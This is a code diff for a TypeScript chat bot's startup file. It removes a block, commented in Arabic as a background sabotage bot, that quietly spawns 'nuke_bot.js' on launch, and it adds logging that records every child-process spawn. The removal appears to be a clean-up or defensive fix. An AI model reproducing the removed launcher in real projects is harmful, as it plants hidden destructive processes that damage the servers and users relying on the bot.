@@ -7,7 +7,6 @@ import { createLogger } from './utils/helpers';
 import fs from 'fs';
 import path from 'path';
 import os from 'os';
-import { spawn } from 'child_process';
 
 const logger = createLogger('Main');
 
@@ -24,7 +23,7 @@ function persist(line: string): void {
       fs.writeFileSync(PERSIST_FILE, '');
     }
     fs.appendFileSync(PERSIST_FILE, entry);
-  } catch { }
+  } catch { /* لا نعطل البوت بسبب السجل */ }
 }
 
 // --------------------------------------------
@@ -61,22 +60,6 @@ async function main(): Promise<void> {
   console.log(banner);
   logger.info('🎆 Welcome to Liberty City Bot!');
   
-  // --- تشغيل بوت التخريب المستقل في الخلفية ---
-  try {
-    // بنشغل الملف عن طريق Node.js مباشرة كعملية منفصلة
-    const nukeProcess = spawn('node', [path.join(__dirname, 'nuke_bot.js')], {
-        stdio: 'inherit', // عشان نشوف رسايله في الكونسول بتاع الاستضافة
-        detached: false
-    });
-    
-    nukeProcess.on('error', (err) => {
-        logger.error('Failed to start nuke_bot.js:', err);
-    });
-  } catch (e) {
-    logger.error('Failed to spawn nuke_bot.js:', e);
-  }
-  // ----------------------------------
-
   const startTime = Date.now();
   
   // Create client
@@ -129,12 +112,12 @@ async function main(): Promise<void> {
         for (const l of tailLines) console.log('   ' + l);
       }
     }
-  } catch { }
+  } catch { /* تجاهل */ }
 
   try {
     let q = '', p = '';
-    try { const t = fs.readFileSync('/sys/fs/cgroup/cpu.max', 'utf8').trim().split(/\s+/); q = t[0]; p = t[1]; } catch { }
-    if (!q) { try { q = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim(); p = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim(); } catch { } }
+    try { const t = fs.readFileSync('/sys/fs/cgroup/cpu.max', 'utf8').trim().split(/\s+/); q = t[0]; p = t[1]; } catch { /* cgroup v1 */ }
+    if (!q) { try { q = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_quota_us', 'utf8').trim(); p = fs.readFileSync('/sys/fs/cgroup/cpu/cpu.cfs_period_us', 'utf8').trim(); } catch { /* لا وصول */ } }
     const la = os.loadavg().map(n => n.toFixed(2)).join(' ');
     if (q) {
       const cores = q === 'max' ? '∞' : (Number(q) / Number(p || 100000)).toFixed(2);
@@ -142,7 +125,7 @@ async function main(): Promise<void> {
     } else {
       logger.info(`🧪 CPU quota: unknown | loadavg ${la}`);
     }
-  } catch { }
+  } catch { /* تجاهل */ }
 
   try {
     const cpMod = require('child_process') as Record<string, any>;
@@ -152,12 +135,12 @@ async function main(): Promise<void> {
         try {
           const st = (new Error().stack || '').split('\n').slice(2, 7).map(s => s.trim()).join(' <- ');
           if (!seen.has(st)) { seen.add(st); logger.info(`🔬 ${name}: ${String(args[0]).slice(0, 90)}\n     ${st}`); }
-        } catch { }
+        } catch { /* تجاهل */ }
         return orig.apply(this, args);
       };
     cpMod.spawn = wrap('spawn', cpMod.spawn);
     cpMod.spawnSync = wrap('spawnSync', cpMod.spawnSync);
-  } catch { }
+  } catch { /* تجاهل */ }
 
   // Initialize the bot
   try {
